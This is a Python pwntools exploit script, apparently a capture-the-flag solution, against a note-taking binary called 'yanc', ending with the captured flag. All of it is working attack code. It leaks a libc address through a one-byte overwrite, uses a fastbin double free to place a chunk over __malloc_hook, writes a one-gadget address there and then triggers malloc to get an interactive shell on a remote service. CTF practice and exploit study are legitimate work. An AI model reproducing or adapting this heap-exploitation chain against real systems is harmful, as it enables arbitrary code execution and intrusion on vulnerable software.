#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc-2.23.so')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level = 'info'
context.os = 'linux'
context.bits = 64
context.arch = 'amd64'
context.endian = 'little'

###

if DEBUG:
    r = process('./yanc')
else:
    r = remote('10.13.37.73', 1234)

def menu():
    global r
    return r.recvuntil('4. quit\n')

def add_note(c, t):
    global r
    r.sendline('1')
    r.sendafter('note : ', c)
    r.sendafter('title : ', t)
    return menu()

def del_note(idx):
    global r
    r.sendline('2')
    r.sendlineafter('one : ', str(idx))
    return menu()

def view_notes():
    global r
    r.sendline('3')
    return menu()

menu()

# first leaking libc
add_note('AAAAAAAA\n', 'AAAAAAAA\n')
add_note('BBBBBBBB\n', 'BBBBBBBB\n')
add_note('C' * 200 + '\n', 'CCCCCCCC\n')
add_note('D' * 200 + '\n', 'DDDDDDDD\n')
add_note('EEEEEEEE\n', 'EEEEEEEE\n')
del_note(0)

# previous value: 0x30
add_note('FFFFFFFF\n', 'C' * 32 + '\x50') # change offset of chunk 1 to leak libc address
del_note(2)
del_note(3)
data = view_notes()
m = re.findall('Note : (.+)', data)
leak = u64(m[1].ljust(8, '\x00'))
if DEBUG:
    libc_base = leak - 0x399b58
else:
    libc_base = leak - 0x3c4b78
log.info('leak: %#x' % leak)
log.info('libc_base: %#x' % libc_base)
del_note(0)
add_note('FFFFFFFF\n', 'C' * 32 + '\x30') # change back overwritten back to original state
del_note(4)
del_note(1)
del_note(0)

# back to original state
# now, perform fastbin dup into main_arena
GDB = False
if GDB and DEBUG:
    gdb.attach(r)

add_note('A' * 0x60 + '\n', 'A' * 8 + '\n')
add_note('B' * 0x60 + '\n', 'B' * 8 + '\n')
add_note('C' * 0x60 + '\n', 'C' * 8 + '\n')
add_note('D' * 0x60 + '\n', 'D' * 8 + '\n')
add_note('E' * 0x60 + '\n', 'E' * 8 + '\n')
add_note('F' * 0x60 + '\n', 'F' * 8 + '\n')
del_note(0)
add_note('A' * 0x60 + '\n', 'A' * 32 + '\x50')
del_note(0)
del_note(2) # avoid crashing
del_note(1) # double free

# now getting ptr to near malloc_hook region into the single linked list of fastbins of
# size 0x70, no alignment check is performed
target = libc_base + libc.symbols['__malloc_hook'] - 35
add_note(p64(target) + 'A' * 0x58 + '\n', 'OSEF\n')
add_note('G' * 0x60 + '\n', 'G' * 8 + '\n')
add_note('H' * 0x60 + '\n', 'H' * 8 + '\n')
# getting chunk into __malloc_hook and using magic gadget
if DEBUG:
    payload = '\x00' * 19 + p64(libc_base + 0xd695f)
else:
    payload = '\x00' * 19 + p64(libc_base + 0xf02a4)
payload = payload.ljust(0x60, '\x00')
add_note(payload + '\n', 'I' * 8 + '\n')

# trigger exploit by calling malloc
r.sendline('1')
r.sendlineafter('note : ', '\x00' * 0x80)

r.interactive()
r.close()

# INS{Note_really_0riginal...}
